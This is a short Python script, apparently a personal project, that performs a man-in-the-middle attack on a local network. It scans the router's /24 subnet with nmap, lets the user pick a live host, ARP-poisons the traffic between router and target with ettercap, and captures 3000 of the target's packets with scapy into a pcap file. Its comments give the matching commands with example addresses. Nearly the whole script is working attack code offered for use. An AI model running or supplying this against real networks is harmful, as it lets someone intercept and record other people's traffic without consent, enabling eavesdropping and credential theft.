'''
Man in the middle attack

Need ettercap installed and nmap
'''


'''
scan nmap
sudo nmap -sn [router ip number]/24
ex: sudo nmap -sn 10.133.0.254/24

choose ip addr and mim attack
sudo ettercap -T -S -i en0 -M arp:remote /[router ip number]// /[target]//
ex: sudo ettercap -T -S -i en0 -M arp:remote /10.133.0.254// /10.133.0.14//

Need ettercap, netifaces, nmap, python-nmap
'''

from requests import get
import netifaces
import socket    
import nmap
import subprocess
from scapy.all import *

# public_ip = get('https://api.ipify.org').content.decode('utf8')
# # print('My public IP address is: {}'.format(public_ip))
# hostname = socket.gethostname()    
# IPAddr = socket.gethostbyname(hostname) 
# print("Your Computer Name is:" + hostname)    
# print("Your Computer IP Address is:" + IPAddr) 

nm = nmap.PortScanner()
gws=netifaces.gateways()
router = gws['default'][2][0] # Not sure if this 2 is applicable

external_hosts = []
nm.scan(hosts=f'{router}/24', arguments='-sn')
hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]

print("Available hosts:")
for host, status in hosts_list:
    if status == "up":
        print(host)
        external_hosts.append(host)

target = input("Which ip address should we be scanning?")
subprocess.run(f"sudo ettercap -T -S -i en0 -M arp:remote /{router}// /{target}//")
capture = sniff(count=3000, filter=f'host {target}')
wrpcap(f"traces/MIM/capture_file", capture)